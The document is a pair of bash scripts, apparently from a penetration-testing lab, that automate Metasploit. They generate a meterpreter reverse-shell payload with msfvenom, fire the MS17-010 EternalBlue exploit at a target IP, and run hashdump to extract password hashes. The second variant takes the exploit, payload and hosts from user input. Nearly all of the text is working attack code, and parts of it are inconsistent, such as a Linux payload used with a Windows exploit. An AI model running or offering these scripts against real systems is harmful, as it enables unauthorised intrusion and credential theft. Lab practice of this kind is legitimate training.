#!/bin/bash

# Define variables for Metasploit payload
LHOST="10.0.2.8"  # Attacker's IP
LPORT="4444"       # Listener Port
OUTPUT="payload.elf" # Payload output file
RHOSTS="10.0.2.9"  # Target IP

# Step 1: Generate payload (optional, if not already created)
if [ ! -f $OUTPUT ]; then
  msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf -o $OUTPUT
  if [ $? -ne 0 ]; then
    echo "[!] Failed to generate payload"
    exit 1
  fi
  echo "[+] Payload generated as $OUTPUT"
else
  echo "[+] Using existing payload: $OUTPUT"
fi

# Step 2: Configure exploit for ms17_010_eternalblue
echo "use exploit/windows/smb/ms17_010_eternalblue" > metasploit_exploit.rc
echo "set RHOSTS $RHOSTS" >> metasploit_exploit.rc
echo "set LHOST $LHOST" >> metasploit_exploit.rc
echo "exploit -z" >> metasploit_exploit.rc

msfconsole -r metasploit_exploit.rc &

# Step 3: Wait for a valid session
echo "[+] Waiting for a valid Meterpreter session..."
sleep 10
SESSION_ID=$(msfconsole -x "sessions -l" | grep "meterpreter" | awk '{print $1}' | head -n 1)

if [ -z "$SESSION_ID" ]; then
  echo "[!] No valid session found. Exiting."
  exit 1
fi
echo "[+] Valid session found: ID $SESSION_ID"

# Step 4: Run hashdump module
echo "use post/windows/gather/hashdump" > metasploit_hashdump.rc
echo "set SESSION $SESSION_ID" >> metasploit_hashdump.rc
echo "run" >> metasploit_hashdump.rc

msfconsole -r metasploit_hashdump.rc

# Step 5: Add notes and loot to document the scan
echo "[+] Adding notes for the target $RHOSTS"
msfconsole -x "notes -h $RHOSTS -t exploit -a 'MS17-010 EternalBlue exploit executed.'"
msfconsole -x "notes -h $RHOSTS -t hashdump -a 'Hashdump module executed successfully.'"

echo "[+] Generating loot from the scan results."
msfconsole -x "loot -t csv"

echo "[+] Script execution completed."





---------------------------------------------------------------------------------------------
NB:autre facon  de faire le script
---------------------------------------------------------------------------------------------
#!/bin/bash

# Start PostgreSQL and Metasploit
echo "Starting PostgreSQL and Metasploit..."
sudo systemctl start postgresql
sudo msfdb init

# Request information before starting Metasploit
echo "Select the exploit"
read EXPLOIT

echo "Select the payload"
read PAYLOAD

echo "Enter your LHOST"
read LHOST

echo "Enter your LPORT"
read LPORT

echo "Enter the target IP"
read RHOST

# Start Metasploit Console in non-interactive mode with all configured commands
echo "Starting Metasploit Console..."
msfconsole -q -x "
use $EXPLOIT;
set PAYLOAD $PAYLOAD;
set LHOST $LHOST;
set LPORT $LPORT;
set RHOST $RHOST;
exploit -z;
exit;
"

# Save the notes to the CSV file
echo "Saving the notes to notes.csv..."
echo "$(date +%Y-%m-%d\ %H:%M:%S),$RHOST,SMB,445,TCP,Exploitation,MS17-010 EternalBlue exploit executed successfully" >> notes.csv

# Document loot in CSV
echo "Documenting loot..."
loot -t csv

# Create the payload
echo "Creating the payload..."
msfvenom -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -f elf > payload.elf
echo "Payload created: payload.elf"
